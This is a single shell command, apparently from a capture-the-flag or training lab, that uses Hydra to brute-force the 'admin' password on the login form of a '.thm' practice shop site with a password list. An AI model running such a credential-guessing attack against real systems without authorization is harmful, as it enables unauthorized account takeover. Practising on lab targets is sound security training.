hydra -l admin -P passlist.txt www.onlineshop.thm http-post-form "/login:username=^USER^\&password=^PASS^:F=incorrect" -V

